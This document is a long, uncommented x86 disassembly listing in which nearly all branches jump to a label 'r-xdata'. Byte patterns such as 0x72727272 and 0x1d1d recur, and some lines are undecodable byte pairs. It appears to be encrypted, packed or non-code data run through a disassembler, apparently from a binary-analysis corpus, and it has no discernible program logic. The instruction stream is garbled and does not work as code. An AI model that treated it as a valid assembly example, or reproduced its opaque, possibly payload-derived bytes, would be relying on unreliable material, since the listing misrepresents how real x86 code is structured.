or ecx [ edi - 0x7 ]
loop r-xdata
loop r-xdata
fldcw [ 0xffffffffe2e467ed ]
cmp ax 0xe2c2
jb r-xdata
loop r-xdata
jl r-xdata
jb r-xdata
in eax dx
xor eax [ ebx + ebp * 2 - 0x7747c749 ]
ror [ ebx ] cl
inc ebp
jb r-xdata
imul esp [ edi + 0xb2c694c ] 0xffffff8b
hlt
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf655edb5
xchg ebx eax
or edi [ edx ]
cmp [ 0x7272721d ] ebx
imul ebx [ ebx - 0x1239396a ] 0x1d318467
sbb eax 0xe2f5cc0a
loop r-xdata
cmp [ edx + 0x6b842469 ] dh
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
add [ 0xffffffffaf6fb51d ] bl
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ecx [ esi ] 0x88fe0e61
xchg [ edx + 0x1d063f0b ] bh
sbb eax 0x72727272
jb r-xdata
or esp [ edx - 0x481d1d05 ]
mov ah 0xa
jpe r-xdata
push ds
sbb eax 0xaf6fb51d
jb r-xdata
imul esp [ edi + 0x1e5b0b48 ] 0x1d
sbb eax 0x72727272
ja r-xdata
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0x8872721d
inc ecx
or eax 0xa76f1d1d
push edx
mov dl 0xb4
outsd
outsd
outsb
pop ds
sbb eax 0x2f370a1d
sbb eax 0x67bbbb1d
and ch ch
imul ecx [ di ] 0x1d
sbb eax 0xb276a76f
and ch ch
xor [ ebx - 0x59 ] ch
or cl ah
cmc
loop r-xdata
popad
jb r-xdata
jb r-xdata
jb r-xdata
xor [ ecx ] 0x1d
sbb eax 0x72727272
sub al 0x69
xchg edi eax
0x5abf6b84 0x3869
jb r-xdata
cld
imul esp [ esp + eax * 4 ] 0x845ebf6b
imul esi [ edi - 0x60947bde ] 0x28
or esp ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
sbb [ 0x1db4b21d ] ebx
mov ch 0xb2
mov ebp 0x72212bbc
jb r-xdata
imul esp [ edi + 0x690bbc1e ] 0x721d1d38
and al 0x84
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in al 0xe2
imul esp [ ebx ] 0xb306784
jpo r-xdata
push ebp
mov cl 0xb4
popad
lahf
push ds
loop r-xdata
imul eax [ ecx ] 0x26611d1d
sbb eax 0xa0e8898a
mov al [ 0xa1a69b4 ]
sbb eax 0xe8898a1d
mov ch 0x6f
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x6b841269 0x97
jb r-xdata
loop r-xdata
or eax [ ebx + 0x721d1d31 ]
jb r-xdata
imul [ ebx - 0x51 ]
push ds
or ebp [ edi + 0x721d1d18 ]
jb r-xdata
mov bh 0x69
push cs
mov bl 0xb5
imul ebx [ edx ] 0xe2f1a90b
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
and al [ ebx + ebp * 2 - 0x1cf4d761 ]
test [ ebx - 0x41 ] ch
mov dl 0x69
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b294
jne r-xdata
sub [ ebx ] cl
loop r-xdata
imul edi [ edi - 0x48947ba2 ] 0x22
test [ ebx - 0x61 ] ch
jb r-xdata
push edx
mov ah 0xb2
or edi [ ebp - 0x1e ]
outsd
jb r-xdata
xor eax 0xbe31a61
retn 0x1d2a
loop r-xdata
loopne r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
outsd
xchg esi eax
mov [ ecx - 0xb58947c ] al
mov edi 0xb76b845e
jb r-xdata
jb r-xdata
xchg edi eax
out dx al
or cl [ edx ]
sub bl [ 0xffffffffee26611d ]
and cl [ bp + di ]
inc esi
or [ 0x7272721d ] bl
imul sp cx 0xe2e2
sbb eax 0x1db21e97
scasd [ edi ]
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
adc al [ ebx + ebp * 2 + 0x69bc0097 ]
jb r-xdata
jb r-xdata
mov edi 0x721d1d33
jb r-xdata
sbb [ 0x7272721d ] bl
push cs
imul esp [ edi + 0x12a76b16 ] 0x1d1dd90b
sbb eax 0x72727272
mov bh 0x16
imul esp [ edi + 0xaa76b1e ] 0x6b1aa769
jb r-xdata
xor cl ah
loop r-xdata
imul esi [ edi - 0x2c7747c8 ] 0xb
jb r-xdata
outsb
jb r-xdata
jb r-xdata
jb r-xdata
pop edx
imul edi [ eax ] 0x842469b2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
pop esi
jb r-xdata
mov eax 0x1d044d0b
jb r-xdata
jecxz r-xdata
imul edx [ 0x1d25f00a ] 0xf226611d
adc dh [ edx + 0xb4aa76f ]
jb r-xdata
fdivr [ edx + 0x6b84b888 ]
jb r-xdata
jge r-xdata
sbb eax 0x7272721d
adc eax 0x1d25f00a
sbb eax 0xbf22661
or al 0x6
loop r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
test [ ebx - 0x49 ] ch
into
mov bh 0x69
jb r-xdata
mov bl 0xb
jb r-xdata
imul ecx [ esi ] 0xe0ce0e63
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xe4
imul edx [ edi + 0x3c69bc00 ] 0xb
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ eax + 0x300bd388 ] bh
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
or eax [ edx + 0x3a ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x1d10d10b
sbb eax 0x35e666ed
sbb eax 0xeaaf691d
leave
sub ch [ eax - 0xe ]
or esp ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
jb r-xdata
inc eax
imul edi [ edi + 0x1aaf6b1e ] 0xb
je r-xdata
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov bh 0x3e
loop r-xdata
jb r-xdata
sub ch [ ecx + 0x2a ]
scasd [ edi ]
jb r-xdata
push cs
popfd
jb r-xdata
popad
sbb ah bl
cmpsd [ esi ] [ edi ]
mov al bl
arpl [ esi ] cx
sbb eax 0x1eaf6fb5
jb r-xdata
jb r-xdata
and esi esi
imul ebp [ edi + 0x18af0b1e ] 0x1d
sbb eax 0x72727272
in eax dx
jb r-xdata
add [ ecx + ebp * 2 - 0x1b4af4c4 ] bh
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
test [ ebx ] ecx
jb r-xdata
loop r-xdata
jb r-xdata
cmp al 0x1d
cmpsd [ esi ] [ edi ]
or ebp [ esi + 0x3c ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x6b848188
cmpsd [ esi ] [ edi ]
hlt
out dx al
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ edx + 0x2bb9bcbd ]
dec edx
jb r-xdata
loop r-xdata
mov [ eax + 0x3ea76b84 ] bh
jb r-xdata
xor cl dl
cmp [ edi - 0x59 ] ebp
test [ ss : ebx - 0x69 ] ch
imul ebp [ edx ] 0x6b8422d1
mov edi 0xa76b8454
jb r-xdata
sbb eax 0x8ae68832
outsd
jb r-xdata
jb r-xdata
loop r-xdata
imul ecx [ esi ] 0x1a69b5b3
or ebp [ ecx + 0x6be2e2f1 ]
imul edi [ ebx + ecx ] 0xe2e2e4b5
jb r-xdata
cmp [ ecx + ebx * 8 + 0x4666ed19 ] esi
jb r-xdata
mov edi 0x9f6b8400
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6e7745ca ] 0x69
xor al [ ebx + ebp * 2 + 0x6a0b34b7 ]
add [ 0xffffffffa769721d ] ebx
jb r-xdata
sub al 0x38
jb r-xdata
jb r-xdata
jb r-xdata
ja r-xdata
imul ecx [ esi ] 0x1d3a420b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ edi - 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
and ah dh
cmpsd [ esi ] [ edi ]
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
test [ ebx - 0x41 ] ch
mov [ edx + 0x1d3c5c0b ] ah
sbb eax 0x1ea76f72
mov dl 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
fidiv [ ebx - 0x9d99ee3 ]
mov dl [ esi ]
jecxz r-xdata
dec edi
and [ bx + di ] ebx
sbb eax 0x550bb21d
fstp [ ecx ]
jb r-xdata
jb r-xdata
push ss
test [ ebx - 0x61 ] ch
jb r-xdata
jb r-xdata
or esp [ edi - 0x4ae2e2d8 ]
mov ch 0xb5
fisubr [ ebx ]
sbb eax 0xb22d11d
mul dl
fldenv [ esi + edx * 8 + 0x28b867ed ]
mov edx 0x32699188
jb r-xdata
sbb eax 0xa3a66f1d
jb r-xdata
rcr [ 0xffffffffa2b76b84 ] 0x1
imul edi [ edi - 0x60947c00 ] 0x16
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or ebp [ eax + edi ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
dec eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi + 0x6b84b9e0 ] 0xffffffbf
jb r-xdata
or ecx [ esi + eax ]
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
sbb eax 0x72727272
sbb eax 0x961deab5
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
mov esp 0xb50b3c69
in al 0xe2
loop r-xdata
imul edx [ edx ] 0x976b84
jb r-xdata
sbb [ 0xffffffff8a72721d ] ebx
loop r-xdata
sbb [ 0x550bb21d ] ebx
loop r-xdata
jb r-xdata
jb r-xdata
or esp [ edx + ecx ]
jb r-xdata
lahf
jb r-xdata
test [ ebx - 0x41 ] ch
push es
mov [ ebp + 0x1d382c0b ] al
jb r-xdata
jb r-xdata
sbb eax 0xa769721d
mov [ ecx + 0x6b843269 ] dl
mov bh 0x34
jb r-xdata
sbb eax 0x7272721d
outsd
jb r-xdata
loop r-xdata
add [ ebx + ebp * 2 + 0x1dd1169f ] al
test [ ebx - 0x49 ] ch
mov [ 0x30d13a69 ] al
or edx ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb al 0xb
cmp [ 0xffffffffa3a66f1d ] bl
jb r-xdata
mov edx 0x6b84b888
jb r-xdata
or dh al
jb r-xdata
or ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
or al [ 0xffffffffb41d1d27 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push es
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
sbb ch [ esi ]
adc cl [ ebx ]
fstp [ 0x72721d1d ]
jb r-xdata
mov bl [ edx ]
test [ ebx - 0x69 ] ch
and eax 0x2a76b84
mov ch 0xea
sbb eax 0x1deac696
mov ch 0xce
or ebp [ esi ]
sub ebx [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0xb
aam 0x37
sbb eax 0x7272721d
jb r-xdata
inc esp
jb r-xdata
sbb eax 0x7272721d
sbb ch [ ecx + 0x32 ]
test [ ebx - 0x41 ] ch
mov edx 0x14a76b84
shl [ edx ] 0x1
mov [ esi + 0x1d039f0b ] ah
sbb eax 0xedeb1861
jmp r-xdata
or bl [ 0xffffffffed72721d ]
jb r-xdata
jb r-xdata
or [ ecx ] 0xffffffb5
salc
jb r-xdata
jb r-xdata
or ebp [ edx + 0x1 ]
imul esi [ edx ] 0x34b76b84
in eax dx
mov [ 0x2a480b1c ] eax
jb r-xdata
imul edi [ edx ] 0xd50b30d1
imul ebx [ edi - 0x7be22eea ] 0x6b
mov bh 0xa2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1ca3a66f
jb r-xdata
or eax [ ecx + edi * 8 ]
mov eax 0x3ea76b84
jb r-xdata
and eax 0x26611d1d
or ecx [ esi + eax ]
sub esp [ ecx ]
jb r-xdata
push es
movsb [ edi ] [ esi ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov cl [ edi ]
sbb [ ecx + 0x316a0b74 ] eax
sbb eax 0x7272721d
jb r-xdata
sub al 0x1d
sbb eax 0x1d2b500a
sbb eax 0x14671269
in eax dx
daa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and eax 0xe2e31ea7
xor cl [ eax - 0x2d1d751a ]
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
adc al 0x1d
jb r-xdata
imul ebp [ ebx + ecx ] 0xe2e2f48b
jb r-xdata
imul ebp [ edi - 0x58947bbc ] 0x4c
jb r-xdata
xchg edi eax
jb r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1aa7690a ] 0x6b
test [ ecx - 0x24 ] ah
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x86ad378a
shl [ ebp + 0x1d3e650b ] 0x1d
jb r-xdata
or [ ebp + 0x1d3cdb0a ] esi
jb r-xdata
mov al [ eax + 0x44 ]
out dx al
sub esp [ ecx ]
jb r-xdata
sbb eax 0x66ed7272
jmp 0x1e28a721
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
ror [ eax + 0x21d60b86 ] 0x1
sbb eax 0x8872721d
sar [ ebx + 0x2369c788 ] 0x84
inc eax
jb r-xdata
imul ebx [ edx ] 0x6b843269
jb r-xdata
enter 0x1d2a 0x1d
jb r-xdata
or ecx [ eax + 0x2a ]
jb r-xdata
imul edi [ edi + 0xb858806 ] 0x2c
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
imul esp [ edi - 0x6fbf4c2 ] 0xffffffe2
loop r-xdata
or ecx [ es : esi + eax ]
jb r-xdata
in eax dx
fucomp st3
loop r-xdata
or dl [ eax + 0x2b ]
or esi [ edi ]
add eax 0xb41d1d27
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x6712691d
adc al 0xed
sbb eax 0x2c370bb4
sbb eax 0x2b500a1d
test [ ebx - 0x41 ] ch
test [ ebx - 0x49 ] ch
xor al 0xb
push 0x1
imul esp [ ebx ] 0x36a76b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
mov [ 0x2bb9bcbd ] al
jb r-xdata
jb r-xdata
push ebp
loop r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec esp
inc esp
jb r-xdata
imul ebx [ edi ] 0x1d
mov [ edi + 0x26af6b84 ] dl
jb r-xdata
jb r-xdata
or bl bl
jb r-xdata
jb r-xdata
mov bl cl
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
salc
jb r-xdata
jb r-xdata
mov edi 0xb367ed1e
mov eax 0xdb1d1d28
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0xa2b76b84
mov eax 0xd0b76b84
mov [ esi + 0x1d21d60b ] al
sbb eax 0xc0887272
mov ebx 0x2369c788
mov edx 0x32699188
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or esi edx
jb r-xdata
out 0x88 al
aam 0xb9
test [ ebx - 0x41 ] ch
test [ ebx - 0x59 ] ch
mov eax [ 0xbe2e2ea ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
cmp al 0xb
in eax dx
xor al 0xd1
and cl [ ebx ]
cmp [ 0x7272721d ] bl
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
push edx
xor eax 0x72721d1d
jb r-xdata
imul edi [ edi - 0x50947bb0 ] 0x24
mov [ ebx - 0x1d061df5 ] cl
loop r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
cmp al 0x1d
jb r-xdata
and ch ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0xe2e9130b
loop r-xdata
mov dl 0xa
std
add ebx [ 0xffffffffee26611d ]
jb r-xdata
jb r-xdata
mov eax 0xdb1d1d28
jb r-xdata
mov ch 0xa
jb r-xdata
sbb eax 0x1ebfdb1d
fldenv [ esi + edx * 8 + 0x28b867ed ]
xchg ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c959 ]
sub [ 0xffffffff971db21d ] bl
fstp [ edi - 0x4c9812e2 ]
jb r-xdata
jb r-xdata
imul esi [ edi - 0x1af447fa ] 0xf
sbb eax 0x7272721d
and [ 0x22d1721d ] ebx
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esp [ edi - 0x12dd98e2 ] 0x66
int3
popad
fsubr st2
or ebp [ ebx + 0x1f ]
test [ ecx - 0x67 ] ah
movsb [ edi ] [ esi ]
loop r-xdata
push es
or edx [ ebx + 0x5 ]
jb r-xdata
push cs
sbb eax 0x7272721d
jb r-xdata
imul edi [ es : 0x52bf6b84 ] 0x84bb3a69
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
push cs
out dx al
mov cl 0xb5
and ch ch
inc bp
add bl [ 0x2aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh [ esi - 0x10 ]
loop r-xdata
pop ax
jb r-xdata
pop esi
loop r-xdata
jb r-xdata
or eax esp
jb r-xdata
adc al 0xed
jb r-xdata
push 0xffcf
sbb eax 0x1269311d
xchg ebx eax
push ds
or esp ecx
shl dl 0x1
loop r-xdata
cmpsd [ esi ] [ edi ]
mov cl 0xb2
sbb eax 0x88ee2661
loop r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
sub [ 0x1ebfdb1d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
fstp [ ebx - 0x52c875e3 ]
jb r-xdata
mov eax [ 0xffffffffffffe2ea ]
jb r-xdata
jb r-xdata
push ds
jb r-xdata
sbb eax 0x2bd186b4
sbb eax 0xbc22d172
sub esp [ ecx ]
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
in al 0x88
salc
mov edi 0x6b84b9e0
mov edi 0xb9d488e6
jb r-xdata
jb r-xdata
jmp r-xdata
jb r-xdata
loop r-xdata
push ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax dx
push ds
adc [ 0x7221bc1d ] ebx
jb r-xdata
imul edi [ 0x52bf6b84 ] 0x84bb3a69
jb r-xdata
jb r-xdata
or dl ah
imul ecx [ esi ] 0x1d0a4c0b
or ch [ ebx ]
sbb [ 0xdb88a1d ] bl
and ch ch
dec edx
or al [ ebp - 0x10 ]
loop r-xdata
outsd
scasd [ edi ]
cmp ch [ edi - 0x59 ]
and cl [ bp + di ]
test dl bl
loop r-xdata
loop r-xdata
xor eax 0xa4e2e2d4
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xd1
and cl [ eax + 0x39f0ba6 ]
sbb eax 0xeb18611d
loop r-xdata
jb r-xdata
shl dl 0x1
jb r-xdata
test [ ebx - 0x51 ] ch
push ds
mov bl [ esi + 0x39 ]
jb r-xdata
salc
jb r-xdata
jb r-xdata
push edx
in al 0xe2
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov bl 0x28
sbb eax 0xed1ebfdb
jb r-xdata
imul ebp [ edi - 0x7bc296da ] 0x6b
jb r-xdata
jb r-xdata
xchg al al
mov ch 0xb
sbb eax 0x7272721d
sbb eax 0xad378a1d
jb r-xdata
0xc80be2e2 0x1d2a
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x6f
jb r-xdata
jb r-xdata
loop r-xdata
mul dl
jb r-xdata
mov esp 0x7272212b
shl [ edx ] 0x1
popad
sbb bl [ 0xb2377ed ]
iretd
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
mov ecx 0xeabf6b84
mov ecx 0xe6bf6b84
mov ah dl
mov ecx 0xe4bf6b84
mov dh dl
jb r-xdata
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
mov cl 0xb
pop esp
fsubr st2
loop r-xdata
add ebx [ 0xfffffffff6280b1d ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
adc [ 0xb72721d ] bl
sbb eax 0x26551d1d
jb r-xdata
add eax 0x551d1d1d
jb r-xdata
jb r-xdata
jb r-xdata
push eax
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
fsubrp st0
loop r-xdata
jb r-xdata
jb r-xdata
dec ecx
jb r-xdata
inc ebp
mov bh 0x69
push cs
or edx [ ebx ]
jmp 0xffffffff93638aa2
or ebp [ esi + 0x721d1d03 ]
jb r-xdata
imul ebx [ edx ] 0x66ed1d67

mov dl dh
popad
out dx al
or edx [ edx - 0x1c ]
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0x1d15d60b ] al
loop r-xdata
iretd
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x51 ] ch
sbb al 0xbb
imul ebp [ edx ] 0x1eaf6b84
jb r-xdata
adc al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push es
imul esp [ 0x1d009b0a ] 0x22d1bb1d
or ebp [ ebx ]
in al dx
loop r-xdata
loop r-xdata
loop r-xdata
inc edx
sub al 0x1d
sbb eax 0xdfee2661
or [ eax ] 0xe2
jb r-xdata
and al 0x88
mov ecx [ ebx ]
loop r-xdata
scasd [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov dh [ edi ]
lodsd [ esi ]
sbb eax 0x72727272
mov bh 0x69
push cs
or ecx [ edx + ecx + 0x1d ]
loop r-xdata
jb r-xdata
jb r-xdata
push esp
test [ ebx - 0x59 ] ch
mov [ ebx + ebp * 2 + 0x6f0b06b7 ] es
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
mov ebx 0x6b849a88
scasd [ edi ]
xor al 0xbb
mov [ ebx + 0x3aaf6b84 ] al
mov ebx 0x6b848588
scasd [ edi ]
sbb eax 0xf66aeeaf
jecxz r-xdata
out 0xaa al
jb r-xdata
sbb eax 0xe2f6280b
loop r-xdata
imul ebx [ esi + 0x14d1066f ] 0x280b2c69
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
sbb eax 0xe2e22655
jb r-xdata
sbb eax 0xe226551d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbb3a6952
jb r-xdata
jb r-xdata
or ecx edi
or bl [ 0x741db21d ]
dec esi
jb r-xdata
jb r-xdata
jb r-xdata
adc ebx [ 0xffffffff8ae6881d ]
mov ah 0x82
outsd
or ecx [ edi ]
pop ss
sbb eax 0x6469721d
popad
fild [ edx + 0xbe2e208 ]
push ebx
cmp al 0x1d
sbb eax 0x72727272
out dx al
jb r-xdata
push cs
popad
push cs
mov [ ebx - 0x7b6b7746 ] al
imul esp [ edi - 0x37f445ee ] 0x12
sbb eax 0x8872721d
retn 0xd80b
jl r-xdata
loop r-xdata
jb r-xdata
or eax 0x850b0fbd
loopne r-xdata
mov dh ah
mov ah dl
shl dl cl
loop r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edx + esi * 4 + 0x1d18610a ] 0x1d
or eax [ eax + 0x5be2e2d7 ]
imul esp [ edi - 0x387745f8 ] 0xffffff84
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x3d7745f4 ] 0xffffff84
imul esp [ edi - 0x13b6f4ee ] 0xffffffe2
loop r-xdata
jb r-xdata
mov ch 0x6b
pop esp
loop r-xdata
cmp [ ecx + 0x5f ] ecx
jb r-xdata
in eax dx
jb r-xdata
xchg edi eax
sbb al 0x84
jb r-xdata
sbb eax 0xed72721d
and al 0xa
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
imul esp [ edi + 0x35520b1a ] 0x1d
sbb eax 0x72727272
imul edi [ edx ] 0xbf6b84bb
cmp eax 0x52bf6b84
jb r-xdata
jb r-xdata
or esp [ edx ]
sbb eax 0x6971db2
jb r-xdata
mov edi 0x843c69ea
imul edi [ edi + 0x1ac60be8 ] 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
test eax 0xa969b3aa
mov edx 0x1d12e90a
sbb eax 0x19590bbb
vpsrad ymm4 ymm5 xmm2
in eax dx
jmp r-xdata
jb r-xdata
jb r-xdata
imul esi [ edi - 0x2ecd967c ] 0x22
jb r-xdata
test [ ebx - 0x59 ] ch
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
mov dl 0x88
cld
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or eax [ eax ]
hlt
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edx + 0x2c ]
sbb eax 0xee26611d
fild [ edx - 0x121d1df8 ]
loop r-xdata
mov bh 0xb
sbb eax 0xed1a9fdb
jb r-xdata
jb r-xdata
jno r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
pop esi
jb r-xdata
loop r-xdata
push ds
sbb eax 0xe90bb21d
cmp ecx esi
loop r-xdata
or [ edx + 0x6b84c788 ] bh
cmpsd [ esi ] [ edi ]
push cs
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov dl al
test [ ebx - 0x59 ] ch
adc cl [ ebx ]
dec ecx
in al dx
test [ ebx - 0x59 ] ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
mov dl 0xa
popad
sbb [ 0xffffffffd7800b1d ] bl
loop r-xdata
pop edi
jb r-xdata
loop r-xdata
push 0xffffffcf
jb r-xdata
add bl [ 0xffffffffb21d881d ]
or ebp [ ebx ]
loop r-xdata
imul ebx [ edi + 0xb1a6914 ] 0x2b
jb r-xdata
mov al ah
or ebx ebp
adc eax 0x72721d1d
sbb eax 0x109f6b84
imul ebx [ ebx ] 0x169f6b84
jb r-xdata
sbb eax 0x971db21d
mov bl 0x28
jb r-xdata
imul edi [ edi - 0x44c596ae ] 0xffffff84
jb r-xdata
jb r-xdata
mov cl 0xb
pop edi
xor [ 0x1a61721d ] ebx
jecxz r-xdata
sbb eax 0xa70b0697
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbe8bf6b
jb r-xdata
jb r-xdata
jb r-xdata
int 0xe1
loop r-xdata
mov al [ edi + 0x5b ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x590bbb1d
sbb [ 0x7272721d ] ebx
shl [ edx ] 0x1
imul esi [ edi - 0x7f77477e ] 0xffffff84
jb r-xdata
sbb eax 0xbb51297
xchg esp eax
in al 0xe2
jb r-xdata
test [ ecx + 0x32 ] ch
jb r-xdata
xchg edx eax
mov bh 0x84
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
outsd
adc [ 0x7272721d ] ebx
jb r-xdata
and ah [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x1d3b680b
sbb ebx ebp
or esi [ ebp + 0x72e2e2f2 ]
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xf6280b1d
jb r-xdata
and [ edx + 0x72 ] esi
bound ebp [ eax ]
sbb eax 0x2267bb1d
in eax dx
mov [ 0x1d3c ] al
sbb eax 0xb2bea76f
or eax ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
mov cl 0xb1
jb r-xdata
test [ ebx - 0x51 ] ch
mov ebx 0x50bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ si ] [ di ]
lahf
jb r-xdata
jb r-xdata
sbb eax 0x1e971d1d
cmp ebp ebp
fist [ ebx ]
scasb [ edi ]
add ebx [ 0x1d72721d ]
mov ch 0x1d
je r-xdata
adc ebx [ 0x1e971d1d ]
mov cl 0xb
fstp [ esi ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
add bl [ 0x3aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
pop eax
test [ ebx - 0x59 ] ch
push ss
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
jb r-xdata
mov ah 0xb5
